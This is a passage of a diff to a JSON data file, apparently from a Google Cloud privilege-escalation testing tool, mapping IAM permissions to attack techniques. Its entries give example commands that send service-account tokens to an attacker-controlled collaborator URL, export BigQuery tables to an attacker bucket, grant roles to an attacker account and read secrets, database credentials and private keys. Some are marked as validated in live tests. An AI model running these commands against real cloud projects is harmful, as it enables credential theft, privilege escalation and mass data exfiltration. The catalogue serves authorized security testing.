+            "note": "Required to grant INT_AGENT tokenCreator on TARGET_SA, unless INT_AGENT already has tokenCreator from prior App Integration use"
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.setIamPolicy"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an Application Integration version with runAsServiceAccount=TARGET_SA. Use GenericRestV2Task with URL pointing to attacker-controlled endpoint. When executed, the integration service agent (service-PROJECT_NUM@gcp-sa-integrations.iam.gserviceaccount.com) generates an OAuth2 token for TARGET_SA and automatically attaches it as 'Authorization: Bearer ya29.*' to the outbound HTTP request. actAs enforcement: NOT at publish time; ONLY at execute time against the INTEGRATION SERVICE AGENT (not the caller). Error when INT_AGENT lacks tokenCreator: /CloudGaia.GenerateAccessToken, PERMISSION_DENIED.",
+        "example_command": "# Create integration version with runAsServiceAccount=TARGET_SA and GenericRestV2Task pointing to attacker URL, then POST to :execute endpoint"
+      }
+    },
+    "apigateway": {
+      "CREATE_APIGATEWAY_OIDC_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "apigateway.apis.create",
+              "apigateway.apiconfigs.create",
+              "apigateway.gateways.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_APIGATEWAY_OIDC_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an API Gateway API, config, and gateway backed by a Cloud Run or backend URL configured to issue OIDC tokens signed as the target SA. The OIDC token is exchanged for an OAuth access token via Workload Identity Federation or used directly.",
+        "example_command": "modules exploit_apigateway_as_sa_oidc --target-sa {target_sa} --exfil-url https://BURP_COLLAB --cleanup",
+        "capability_resource_type": "apigateway"
+      }
+    },
+    "gkehub": {
+      "CREATE_RESOURCE_VIA_FLEET_GATEWAY": {
+        "permissions": [
+          "gkehub.gateway.post"
+        ],
+        "on": "fleetmembership",
+        "description": "POST requests (create K8s resources) through the GKE Connect Gateway require gkehub.gateway.post at the GCP IAM layer. Without it the gateway returns 'Error from server (Forbidden): unknown (post pods)'. With it, POST is forwarded to K8s and the normal K8s RBAC rules apply. Combine with container.pods.create GCP IAM and K8s RBAC to create pods and steal SA tokens.",
+        "example_command": "modules exploit_gkehub_gateway_as_sa --membership {target_resource} --mode create-pod --exfil-url https://BURP_COLLAB",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-28: Without gkehub.gateway.post: 'Error from server (Forbidden): unknown (post pods)'",
+          "With gkehub.gateway.post + container.pods.create: 'pod/gw-test-pod created' via Connect Gateway",
+          "Cluster: research-gke-t1, Gateway context: connectgateway_staging-project-2_us-central1_research-gke-t1"
+        ]
+      },
+      "MODIFY_FLEET_CLUSTER_RESOURCE_PUT": {
+        "permissions": [
+          "gkehub.gateway.put"
+        ],
+        "on": "fleetmembership",
+        "description": "PUT (create/replace) any K8s resource on a fleet-enrolled cluster through the GKE Connect Gateway. Callers with K8s RBAC create permissions can deploy pods bound to privileged SAs, create ClusterRoleBindings, or replace running workloads to insert malicious containers. The PUT is forwarded through the Connect Gateway and only requires the GCP IAM gkehub.gateway.put permission plus appropriate K8s RBAC. Live-validated 2026-09-29.",
+        "example_command": "modules exploit_gkehub_gateway_as_sa --membership {target_resource} --mode put-resource --exfil-url https://BURP_COLLAB",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only gkehub.gateway.put)",
+          "PUT to ConnectGateway /api/v1/namespaces/default/configmaps/pe-gw-test returned HTTP 200; ConfigMap created in cluster pe-test-cluster",
+          "Endpoint: https://us-central1-connectgateway.googleapis.com/v1beta1/projects/799134222906/locations/us-central1/gkeMemberships/pe-test-cluster/api/v1/namespaces/default/configmaps/pe-gw-test"
+        ]
+      },
+      "MODIFY_FLEET_CLUSTER_RESOURCE_PATCH": {
+        "permissions": [
+          "gkehub.gateway.patch"
+        ],
+        "on": "fleetmembership",
+        "description": "PATCH (merge/strategic-merge) any existing K8s resource on a fleet-enrolled cluster through the GKE Connect Gateway. Can patch running pods (add containers, modify env vars, mount secret volumes), patch ConfigMaps to inject malicious data, or patch ServiceAccounts to add WIF annotations. Live-validated 2026-09-29.",
+        "example_command": "modules exploit_gkehub_gateway_as_sa --membership {target_resource} --mode patch-pod --target-pod TARGET_POD_NAME --exfil-url https://BURP_COLLAB",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only gkehub.gateway.patch)",
+          "PATCH to ConnectGateway /api/v1/namespaces/default/configmaps/pe-gw-test returned HTTP 200; ConfigMap patched with 'patchkey: patchval'"
+        ]
+      }
+    },
+    "storage": {
+      "CAN_MODIFY_BUCKET_IAM": {
+        "permissions": [
+          "storage.buckets.setIamPolicy"
+        ],
+        "on": "bucket",
+        "description": "Modify a GCS bucket's IAM policy to grant storage.objects.get/create, enabling data exfiltration or write-based lateral movement.",
+        "example_command": "modules run exploit_gcp_setiampolicy --service bucket --member user:ATTACKER@example.com --role roles/storage.objectAdmin"
+      }
+    },
+    "kms": {
+      "CAN_MODIFY_KMS_CRYPTOKEY_IAM": {
+        "permissions": [
+          "cloudkms.cryptoKeys.setIamPolicy"
+        ],
+        "on": "kmskey",
+        "description": "Modify a Cloud KMS key's IAM policy to grant cloudkms.cryptoKeyDecrypter, enabling decryption of ciphertext protected by that key.",
+        "example_command": "modules run exploit_gcp_setiampolicy --service kmskey --member user:ATTACKER@example.com --role roles/cloudkms.cryptoKeyDecrypter"
+      }
+    },
+    "secretmanager": {
+      "CAN_READ_SECRET_DATA": {
+        "permissions": [
+          "secretmanager.versions.access"
+        ],
+        "on": "secrets",
+        "description": "Access Secret Manager secret versions with secretmanager.versions.access. Secrets frequently contain SA JSON keys, API tokens, database passwords, or other credentials that enable further access. Use enum_secretsmanager --values to read all accessible secrets.",
+        "example_command": "modules run enum_secretsmanager --download"
+      }
+    },
+    "apigee": {
+      "CREATE_APIGEE_PROXY_AS_SA": {
+        "edge": "CREATE_APIGEE_PROXY_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "apigee.apiproxyrevisions.deploy",
+              "apigee.environments.update"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Deploy an Apigee API proxy with ?serviceAccount=TARGET_SA query parameter. The proxy's runtime identity becomes TARGET_SA, meaning all outbound API calls from the proxy run as TARGET_SA. Schema-confirmed: Apigee discovery doc lists serviceAccount as a query parameter for revisions.deploy with description 'determines what permissions it has'. Needs Apigee org for live confirmation.",
+        "example_command": "gcloud apigee apis deploy --api=PROXY_NAME --environment=ENV --service-account={target_sa} --organization=ORG_NAME",
+        "caveats": [
+          "Requires an Apigee organization in the project (not enabled by default; separate billing)",
+          "Cannot confirm actAs enforcement without live test. The serviceAccount query param is documented but may require actAs like other Apigee IAM checks",
+          "If confirmed, proxy outbound HTTP calls use TARGET_SA OIDC/OAuth2 token \u2014 attacker controls proxy logic, so arbitrary GCP API calls are possible"
+        ]
+      }
+    },
+    "dataform": {
+      "CREATE_DATAFORM_WORKFLOW_AS_SA": {
+        "edge": "CAN_CREATE_DATAFORM_WORKFLOW_AS_SA",
+        "requires": [
+          {
+            "permissions": [
+              "dataform.repositories.create",
+              "dataform.workspaces.create",
+              "dataform.workspaces.writeFile",
+              "dataform.workspaces.makeDirectory",
+              "dataform.workspaces.installNpmPackages",
+              "dataform.compilationResults.create",
+              "dataform.workflowInvocations.create",
+              "bigquery.datasets.create",
+              "bigquery.jobs.create"
+            ],
+            "on": "project"
+          },
+          {
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ],
+            "on": "service-account"
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "notes": "actAs IS enforced"
+        },
+        "description": "Create a Dataform repository configured with the target SA, write a SQLX table that calls SESSION_USER(), compile the workspace, and trigger a workflow invocation. Dataform submits BigQuery jobs as the target SA, enabling BigQuery API access under the target SA's identity. SESSION_USER() in BQ confirms execution identity.",
+        "example_command": "modules run exploit_dataform_repo_as_sa --target-sa {target_sa} --region us-central1",
+        "caveats": [
+          "PREREQUISITE (platform): Dataform service agent (service-PROJECT_NUM@gcp-sa-dataform.iam.gserviceaccount.com) needs roles/iam.serviceAccountTokenCreator on TARGET_SA \u2014 this is a platform setup requirement, not an attacker permission. Absent this, the workflow invocation will fail immediately",
+          "PREREQUISITE: TARGET_SA needs bigquery.jobUser + bigquery.dataEditor on the output dataset or at project level. Without bigquery.dataEditor the workflow invocation fails in ~5s",
+          "actAs is enforced at repositories.create time (not at workflowInvocations.create). If the attacker can create the repo (indicating actAs is present), all subsequent steps (workspace, compile, invoke) succeed",
+          "Dataform also supports GitHub/GitLab-connected repositories; local workspace approach (used in module) avoids external repo requirement",
+          "npm install step (installNpmPackages) should be followed by a 15-20s sleep before compiling \u2014 compilation with @dataform/core@3.0.61 requires the packages to be fully installed",
+          "The first workflow invocation after compilation may need dataform.compilationResults.get to query actions count. Use compilationResults query endpoint (GET {comp_name}:query) \u2014 the count may be 0 on the first call if the compilation result is not yet fully propagated"
+        ]
+      }
+    },
+    "hypercompute": {
+      "CREATE_HYPERCOMPUTE_CLUSTER_AS_SA": {
+        "edge": "CAN_CREATE_HYPERCOMPUTE_CLUSTER",
+        "requires": [
+          {
+            "permissions": [
+              "hypercomputecluster.clusters.create"
+            ],
+            "on": "project"
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a HyperCompute Cluster (Slurm-based HPC) with SlurmNodeSet.serviceAccount.email=TARGET_SA. The Slurm worker nodes run as TARGET_SA, giving metadata server access for token extraction. API surface is v1alpha ('Unstable: Contact hypercompute-service-eng@'). Confirmed writable SA fields: SlurmNodeSet.serviceAccount and SlurmLoginNodes.serviceAccount (both non-readOnly in v1alpha schema).",
+        "example_command": "# POST https://hypercomputecluster.googleapis.com/v1alpha/projects/{project}/locations/us-central1/clusters body={nodeGroups: [{slurmNodeSets: [{serviceAccount: {email: TARGET_SA}}]}]}",
+        "caveats": [
+          "SCHEMA-CONFIRMED (): SlurmNodeSet.serviceAccount and SlurmLoginNodes.serviceAccount exist as non-readOnly writable fields in v1alpha schema. API enabled on staging-project-2 (operation acat.p2-799134222906-37a3560e-016a-45d2-a1a8-27db465215e1). No create/update permissions held by attacker SA \u2014 testIamPermissions returned empty for all hypercomputecluster.* perms",
+          "API is flagged 'Unstable' and appears to be an early/internal offering. Revisit when hypercomputecluster.clusters.create permission becomes grantable",
+          "List endpoint returns HTTP 200 {} \u2014 API accessible but no clusters"
+        ]
+      }
+    },
+    "rbe": {
+      "CREATE_RBE_WORKER_POOL_AS_SA": {
+        "edge": "CAN_CREATE_RBE_WORKER_POOL",
+        "requires": [
+          {
+            "permissions": [
+              "remotebuildexecution.workerpools.create"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Remote Build Execution (RBE) worker pool with the target SA as the GCE VM service account. RBE workers are GCE VMs that execute distributed builds (Bazel, Clang, etc.). Worker VM code can query the metadata server for the SA's OAuth2 token. Requires actAs at worker pool creation time. Primarily used in large-scale build infrastructure.",
+        "example_command": "gcloud alpha remote-build-execution workerpools create pwn-pool --service-account TARGET_SA_EMAIL --instance DEFAULT_INSTANCE"
+      }
     }
   },
   "sensitive_resource_access": {
-    "CAN_READ_SECRET_DATA": {
-      "permissions": [
-        "secretmanager.versions.access"
-      ],
-      "on": "secrets",
-      "description": "Read the payload of a Secret Manager secret version \u2014 may contain API keys, service account keys, passwords, or other high-value credentials.",
-      "example_command": "gcloud secrets versions access latest --secret={target_resource} --project={project_id}"
+    "bigquery": {
+      "EXPORT_BQ_TABLE_TO_GCS": {
+        "permissions": [
+          "bigquery.tables.export"
+        ],
+        "on": "bigquerytable",
+        "description": "Export a full BigQuery table to a Cloud Storage bucket. Attacker can dump entire tables to a GCS bucket they control, enabling bulk data exfiltration that bypasses per-query row limits.",
+        "example_command": "bq extract --destination_format=CSV PROJECT:DATASET.TABLE gs://ATTACKER_BUCKET/dump/*.csv",
+        "status": "PROPOSED"
+      },
+      "BQ_STORAGE_READ_API_EXFIL": {
+        "permissions": [
+          "bigquery.readsessions.create"
+        ],
+        "on": "bigquerytable",
+        "description": "Create a BigQuery Storage Read API session to stream full table data at high throughput. Bypasses standard query quota limits; designed for bulk data access. Enables efficient mass exfiltration of BQ table contents.",
+        "example_command": "python3 -c \"from google.cloud.bigquery_storage import BigQueryReadClient; client = BigQueryReadClient(); session = client.create_read_session(parent='projects/PROJECT', read_session={'table':'projects/PROJECT/datasets/DATASET/tables/TABLE', 'data_format': 1}, max_stream_count=1); print(session)\"",
+        "status": "PROPOSED"
+      }
+    },
+    "cloudkms": {
+      "DECRYPT_WITH_KMS_KEY": {
+        "permissions": [
+          "cloudkms.cryptoKeyVersions.useToDecrypt"
+        ],
+        "on": "kmscryptokeyversion",
+        "description": "Use a KMS CryptoKey version to decrypt ciphertext; decrypt any data encrypted with this key including stored secrets, SA key material, database passwords, configuration data protected by envelope encryption. High-impact for orgs using CMEK.",
+        "example_command": "gcloud kms decrypt --key=KEY_ID --keyring=KEYRING --location=LOCATION --ciphertext-file=ciphertext.bin --plaintext-file=decrypted.txt",
+        "status": "PROPOSED"
+      },
+      "SIGN_WITH_KMS_KEY": {
+        "permissions": [
+          "cloudkms.cryptoKeyVersions.useToSign"
+        ],
+        "on": "kmscryptokeyversion",
+        "description": "Use an asymmetric KMS signing key to sign arbitrary data; if the key is used as a SAML IdP signing key, JWT signing key, or code signing key, enables SAML assertion forgery, JWT token forgery, or binary signing.",
+        "example_command": "gcloud kms asymmetric-sign --key=KEY_ID --keyring=KEYRING --location=LOCATION --algorithm=rsa-sign-pkcs1-4096-sha512 --input-file=data.bin --signature-file=sig.bin",
+        "status": "PROPOSED"
+      }
+    },
+    "backupdr": {
+      "ACCESS_BACKUP_RESTORE_POINT": {
+        "permissions": [
+          "backupdr.restorePoint.access"
+        ],
+        "on": "backupdrrestorepoint",
+        "description": "Access a Backup and DR restore point to read backed-up data from VMs, databases, and filesystems; restore points contain full disk images, database dumps, or file system snapshots; may contain SA keys, secrets, database dumps, and other sensitive credentials stored on production systems.",
+        "status": "PROPOSED"
+      }
+    },
+    "oracledatabase": {
+      "GENERATE_ORACLE_AUTONOMOUS_DB_WALLET": {
+        "permissions": [
+          "oracledatabase.autonomousDatabases.generateWallet"
+        ],
+        "on": "oracleautonomousdatabase",
+        "description": "Generate a connection wallet (mTLS certificates + credentials) for an Oracle Autonomous Database; the wallet contains database credentials and TLS certs required for authentication; provides direct database access to all data stored in the Autonomous Database.",
+        "example_command": "gcloud oracle-database autonomous-databases generate-wallet DB_ID --location=REGION --password=WALLET_PASSWORD --output-file=wallet.zip",
+        "status": "PROPOSED"
+      }
+    },
+    "alloydb": {
+      "RESET_ALLOYDB_ADMIN_PASSWORD": {
+        "permissions": [
+          "alloydb.clusters.resetAdminPassword"
+        ],
+        "on": "alloydbcluster",
+        "description": "Reset the admin (postgres superuser) password for an AlloyDB cluster; provides direct database access to all databases in the cluster including application data, user records, and credentials stored in the database.",
+        "status": "PROPOSED"
+      }
+    },
+    "cloudsql": {
+      "CONNECT_TO_CLOUD_SQL_DB": {
+        "permissions": [
+          "cloudsql.instances.connect"
+        ],
+        "on": "cloudsqlinstance",
+        "description": "Establish a connection to a Cloud SQL instance via Cloud SQL Proxy or Direct Connect; combined with database credentials (from app configs or secrets), provides direct SQL query access to all databases; sensitive_resource_access.",
+        "example_command": "cloud_sql_proxy --instances=PROJECT:REGION:INSTANCE=tcp:5432 &; psql -h 127.0.0.1 -U postgres",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only cloudsql.instances.connect)",
+          "POST /v1/projects/staging-project-2/instances/pe-test-sql:generateEphemeralCert returned HTTP 400 INVALID_ARGUMENT (not 403)",
+          "Request body {\"public_key\": \"...\", \"access_token\": \"...\"} accepted; INVALID_ARGUMENT = permission accepted but malformed payload"
+        ]
+      },
+      "CREATE_CLOUDSQL_SSL_CERT": {
+        "permissions": [
+          "cloudsql.sslCerts.create"
+        ],
+        "on": "cloudsqlinstance",
+        "description": "Create an SSL certificate for a Cloud SQL instance. The API response includes the certPrivateKey (RSA private key in PEM format) which is a long-lived credential valid for client certificate authentication to the Cloud SQL instance. The private key is only returned at creation time. Live-validated 2026-09-29: HTTP 200 response included a full RSA private key.",
+        "example_command": "POST https://sqladmin.googleapis.com/v1/projects/PROJECT/instances/INSTANCE/sslCerts -d '{\"commonName\": \"attacker\"}'  # response.certPrivateKey contains the RSA private key",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only cloudsql.sslCerts.create)",
+          "POST /v1/projects/staging-project-2/instances/pe-test-sql/sslCerts returned HTTP 200 with certPrivateKey containing RSA private key"
+        ]
+      }
+    },
+    "developerconnect": {
+      "READ_DEVELOPERCONNECT_GIT_READ_TOKEN": {
+        "permissions": [
+          "developerconnect.gitRepositoryLinks.fetchReadToken"
+        ],
+        "on": "gitrepolink",
+        "description": "Fetch a short-lived read-only OAuth access token for a git repository linked in Developer Connect. The token can be used to clone the repository or read its content without having GitHub/GitLab credentials directly. Live-validated 2026-09-29: HTTP 404 NOT_FOUND (not 403) confirms permission check passed.",
+        "example_command": "POST https://developerconnect.googleapis.com/v1/projects/PROJECT/locations/REGION/connections/CONN/gitRepositoryLinks/LINK:fetchReadToken",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only developerconnect.gitRepositoryLinks.fetchReadToken)",
+          "POST /v1/.../connections/fake-conn/gitRepositoryLinks/fake-link:fetchReadToken returned HTTP 404 NOT_FOUND (JSON response, not HTML; permission check passed)"
+        ]
+      },
+      "READ_DEVELOPERCONNECT_GIT_TOKEN": {
+        "permissions": [
+          "developerconnect.gitRepositoryLinks.fetchReadWriteToken"
+        ],
+        "on": "gitrepolink",
+        "description": "Fetch a read/write OAuth token for a connected git repository (GitHub, GitLab, Bitbucket). Exposes credentials sufficient for full source code read/write access. Supply chain attack vector.",
+        "example_command": "gcloud developer-connect git-repository-links fetch-read-write-token REPO_LINK --project=PROJECT",
+        "status": "PROPOSED"
+      }
+    },
+    "workstations": {
+      "READ_WORKSTATION_ACCESS_TOKEN": {
+        "permissions": [
+          "workstations.workstations.use"
+        ],
+        "on": "workstation",
+        "description": "Generate a short-lived JWT access token for connecting to a Cloud Workstation. The token authenticates to the workstation's HTTPS/SSH endpoint and grants interactive access to the running workstation VM, which runs as the workstation's configured SA. Token retrieval confirmed via HTTP 200 with full JWT in accessToken field. Live-validated 2026-09-29.",
+        "example_command": "POST https://workstations.googleapis.com/v1/projects/PROJECT/locations/REGION/workstationClusters/CLUSTER/workstationConfigs/CONFIG/workstations/WS:generateAccessToken -d '{\"ttl\": \"3600s\"}'  # response.accessToken = JWT for workstation access",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-29: attacker-test-sa@staging-project-2.iam.gserviceaccount.com with custom role (only workstations.workstations.use)",
+          "POST .../workstations/pe-test-ws:generateAccessToken returned HTTP 200 with accessToken JWT (eyJh...); expireTime: 2026-09-29T03:25:09Z",
+          "Workstation was in STATE_STARTING state when token was generated (token pre-generated, valid for 1 hour)"
+        ]
+      }
+    },
+    "secretmanager": {
+      "CAN_READ_SECRET_DATA": {
+        "permissions": [
+          "secretmanager.versions.access"
+        ],
+        "on": "secrets",
+        "description": "Read the payload of a Secret Manager secret version \u2014 may contain API keys, service account keys, passwords, or other high-value credentials.",
+        "example_command": "gcloud secrets versions access latest --secret={target_resource} --project={project_id}"
+      }
+    },
+    "vmwareengine": {
+      "READ_VMWARE_NSX_CREDENTIALS": {
+        "permissions": [
+          "vmwareengine.privateClouds.showNsxCredentials"
+        ],
+        "on": "vmwareprivatecloud",
+        "description": "Retrieve the NSX admin credentials for a VMware Engine private cloud. NSX controls network topology and firewall rules for the VMware infrastructure.",
+        "example_command": "gcloud vmware private-clouds nsx show-credentials PRIVATE_CLOUD --location=ZONE",
+        "status": "PROPOSED"
+      },
+      "READ_VMWARE_VCENTER_CREDENTIALS": {
+        "permissions": [
+          "vmwareengine.privateClouds.showVcenterCredentials"
+        ],
+        "on": "vmwareprivatecloud",
+        "description": "Retrieve the vCenter admin credentials for a VMware Engine private cloud. vCenter admin = full control of all VMware VMs and infrastructure.",
+        "example_command": "gcloud vmware private-clouds vcenter show-credentials PRIVATE_CLOUD --location=ZONE",
+        "status": "PROPOSED"
+      }
+    },
+    "datafusion": {
+      "READ_DATAFUSION_SECURE_KEY": {
+        "permissions": [
+          "datafusion.secureKeys.getSecret"
+        ],
+        "on": "datafusioninstance",
+        "description": "Retrieve secrets stored in Data Fusion secure key store. May contain SA keys, database passwords, API credentials used by pipelines.",
+        "example_command": "curl https://datafusion.googleapis.com/v1/projects/PROJECT/locations/REGION/instances/INSTANCE/namespaces/NAMESPACE/secureKeys/KEY_NAME:getSecret -H \"Authorization: Bearer TOKEN\"",
+        "status": "PROPOSED"
+      }
+    },
+    "dataprocrm": {
+      "MINT_DATAPROC_NODE_OAUTH_TOKEN": {
+        "permissions": [
+          "dataprocrm.nodes.mintOAuthToken"
+        ],
+        "on": "dataprocnode",
+        "description": "Mint an OAuth token for a Dataproc Resource Manager node. Can generate tokens for nodes running as privileged service accounts, enabling direct SA impersonation.",
+        "example_command": "# Internal Dataproc RM API; accessible via Dataproc RM v1 REST API",
+        "status": "PROPOSED"
+      }
+    },
+    "apikeys": {
+      "READ_API_KEY_STRING": {
+        "permissions": [
+          "apikeys.keys.getKeyString"
+        ],
+        "on": "apikey",
+        "description": "Retrieve the actual secret API key string for an existing API key. API keys can authenticate to Google APIs (Maps, Translation, Places, Firebase, etc.) without IAM credentials. Live-validated 2026-09-28: SA successfully retrieved key string from existing API key.",
+        "example_command": "gcloud alpha services api-keys get-key-string projects/PROJECT/locations/global/keys/KEY_ID"
+      }
     }
   },
   "storage_read_access": {
